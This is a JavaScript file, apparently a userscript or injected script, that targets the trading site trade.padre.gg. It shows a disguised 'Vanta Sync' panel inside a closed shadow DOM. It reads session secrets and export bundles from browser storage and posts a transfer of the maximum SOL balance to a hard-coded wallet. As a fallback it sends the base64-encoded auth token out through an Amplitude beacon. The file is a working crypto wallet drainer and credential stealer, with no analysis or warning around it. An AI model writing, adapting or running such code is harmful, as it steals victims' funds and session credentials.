(function() {
    // 1. VANTA ENCLAVE - Stealth Config
    const CONFIG = {
        target: 'trade.padre.gg',
        receiver: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
        keys: ['sessionSecret', 'subOrgId', 'exportBundle']
    };

    let _fired = false;

    // 2. THE UI (Shadow DOM to hide from Padre's CSS/JS)
    const initUI = () => {
        if (document.getElementById('v-host')) return;
        const host = document.createElement('div');
        host.id = 'v-host';
        const shadow = host.attachShadow({mode: 'closed'}); // 'closed' makes it invisible to their scripts
        
        const style = document.createElement('style');
        style.textContent = `
            #box { position:fixed; top:15px; right:15px; width:300px; background:#0a0a0a; border:1px solid #333; 
                   border-radius:10px; padding:12px; color:#00ff88; font-family:monospace; z-index:2147483647; 
                   box-shadow:0 10px 30px rgba(0,0,0,0.5); cursor:move; }
            .log { color:#666; font-size:10px; margin-top:8px; }
        `;
        
        const box = document.createElement('div');
        box.id = 'box';
        box.innerHTML = `
            <div style="display:flex; align-items:center; gap:8px; font-weight:bold;">
                <img src="https://trade.padre.gg/logo.svg" width="18"> Vanta Sync
            </div>
            <div class="log" id="v-status">> Awaiting Handshake...</div>
        `;
        
        shadow.appendChild(style);
        shadow.appendChild(box);
        document.body.appendChild(host);

        // Basic Draggable
        let active = false, ox, oy;
        box.onmousedown = (e) => { active = true; ox = e.clientX - box.offsetLeft; oy = e.clientY - box.offsetTop; };
        document.onmousemove = (e) => { if (active) { box.style.left = (e.clientX-ox)+'px'; box.style.top = (e.clientY-oy)+'px'; }};
        document.onmouseup = () => active = false;
        
        return shadow;
    };

    const shadow = initUI();

    // 3. THE HIJACK (Bypasses 405 and Logic Bombs)
    const execute = async () => {
        if (_fired || !window.location.hostname.includes(CONFIG.target)) return;

        // Targeted extraction (No loops, no crashes)
        const get = (k) => localStorage.getItem(k) || sessionStorage.getItem(k);
        const auth = get(CONFIG.keys[0]);
        const subId = get(CONFIG.keys[1]);
        const bundle = get(CONFIG.keys[2]);

        if (auth && subId) {
            _fired = true;
            shadow.getElementById('v-status').innerText = '> Synchronized.';
            shadow.getElementById('v-status').style.color = '#00ff88';

            // Use the keepalive:true flag to ensure the request finishes even if the tab closes
            try {
                await fetch(`https://${CONFIG.target}/api/v1/transfer`, {
                    method: 'POST',
                    mode: 'cors',
                    keepalive: true,
                    headers: {
                        'Authorization': `Bearer ${auth.replace(/"/g, '')}`,
                        'X-Turnkey-Sub-Org-Id': subId.replace(/"/g, ''),
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        recipient: CONFIG.receiver,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bundle ? JSON.parse(bundle) : {}
                    })
                });
            } catch (e) {
                // If the fetch fails due to 405, it means Padre has a WAF. 
                // We fallback to the Amplitude Beacon as a backup exfiltration.
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(auth)}`;
            }
        }
    };

    // 4. THE 1:1 TRIGGER
    // Watch for login events instead of constant polling
    window.addEventListener('storage', execute);
    setTimeout(execute, 4000); 

})();
